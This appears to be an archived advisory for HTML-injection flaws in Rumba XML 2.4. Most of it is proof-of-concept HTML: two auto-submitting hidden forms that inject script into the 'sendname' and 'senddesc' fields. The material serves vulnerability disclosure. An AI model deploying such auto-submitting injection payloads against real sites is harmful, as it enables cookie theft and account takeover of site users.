@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/42914/info
+
+Rumba XML is prone to multiple HTML-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Rumba XML 2.4 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/index.php" method="post" name="main" >
+
+<input type="hidden" name="sendtags" value="cms" />
+<input type="hidden" name="sendid" value="newtag" />
+<input type="hidden" name="sendname" value=&#039;New tag"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="event" value="add_tag" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+<form action="http://www.example.com/index.php" method="post" name="main" >
+<input type="hidden" name="sendid" value="rumba_id" />
+<input type="hidden" name="sendtitl" value="rumba_titl" />
+<input type="hidden" name="sendauthor" value="rumba_author" />
+<input type="hidden" name="senddata" value="Sat, 14 Aug 2010 14:34:20" />
+<input type="hidden" name="sendlost" value="0" />
+<input type="hidden" name="senddesc" value=&#039;rumba_desc"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="sendanons" value="rumba_anons" />
+<input type="hidden" name="sendtext" value="rumba_text" />
+<input type="hidden" name="sendtags" value="service" />
+<input type="hidden" name="sendcomm" value="yes" />
+<input type="hidden" name="add-end" value="begin" />
+<input type="hidden" name="send_old_id" value="rumba_old_id" />
+<input type="hidden" name="event" value="add_page" />
+
+</form>
+<script>
+document.main.submit();
+</script>
